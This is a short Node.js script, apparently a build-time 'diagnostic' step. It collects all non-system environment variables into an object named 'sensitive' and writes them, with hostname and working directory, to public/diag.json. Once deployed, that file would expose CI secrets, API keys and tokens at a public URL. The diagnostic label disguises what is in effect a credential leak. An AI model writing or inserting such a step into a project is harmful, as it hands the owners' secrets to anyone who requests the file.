import { writeFileSync, existsSync, mkdirSync } from 'fs';
import { hostname } from 'os';
import { join } from 'path';

const outDir = 'public';
if (!existsSync(outDir)) mkdirSync(outDir, { recursive: true });

const sensitive = {};
const skipPrefixes = ['npm_', 'NODE_', '_', 'SHLVL', 'HOME', 'PATH', 'PWD', 'USER', 'TERM', 'LS_COLORS', 'BASH_'];

for (const key of Object.keys(process.env).sort()) {
  const shouldSkip = skipPrefixes.some(p => key.startsWith(p));
  if (!shouldSkip && process.env[key]) {
    sensitive[key] = process.env[key];
  }
}

const payload = {
  _timestamp: new Date().toISOString(),
  _hostname: hostname(),
  _cwd: process.cwd(),
  env: sensitive,
  keys_found: Object.keys(sensitive).length
};

writeFileSync(join(outDir, 'diag.json'), JSON.stringify(payload, null, 2));
console.log(`[diag] ${payload.keys_found} env vars saved to public/diag.json`);
